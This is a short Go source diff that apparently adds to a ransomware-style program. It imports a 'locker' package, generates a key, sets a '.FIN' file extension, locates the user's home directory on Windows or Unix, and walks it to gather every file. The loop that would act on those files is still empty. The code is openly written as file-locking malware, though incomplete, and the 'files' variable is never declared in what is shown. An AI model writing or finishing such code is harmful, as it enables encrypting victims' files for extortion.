@@ -2,7 +2,10 @@ package main
 
 import (
 	"os"
+	"path/filepath"
 	"runtime"
+
+	"github.com/goLocker/locker"
 )
 
 func main() {
@@ -10,7 +13,7 @@ func main() {
 	var home string
 	var ext = ".FIN"
 
-	AESkey := Locker
+	newkey := locker.KeyGen()
 
 	// Logic to determine if host is running Windows
 	if runtime.GOOS == "windows" {
@@ -20,5 +23,13 @@ func main() {
 		}
 	} else {
 		home = os.Getenv("HOME")
+	}
+
+	err := filepath.Walk(home, locker.Walker(&files))
+	if err != nil {
+		panic(err)
+	}
+	for _, file := range files {
+
 	}
 }
